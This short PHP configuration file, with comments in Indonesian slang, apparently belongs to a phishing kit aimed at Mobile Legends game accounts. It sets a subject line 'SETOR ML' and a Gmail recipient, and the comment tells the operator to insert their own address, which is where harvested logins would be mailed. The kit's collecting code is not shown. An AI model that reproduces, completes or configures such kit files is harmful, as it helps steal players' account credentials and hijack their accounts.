<?php

/* CREATED BY Chnrrazz Casley  */

/* Designed BY ALL TEAM CASLEY */

$subjek = 'SETOR ML BY FII UTAMA';
$mailto = 'rivoteam86@gmail.com'; //masukin email lo disini


?>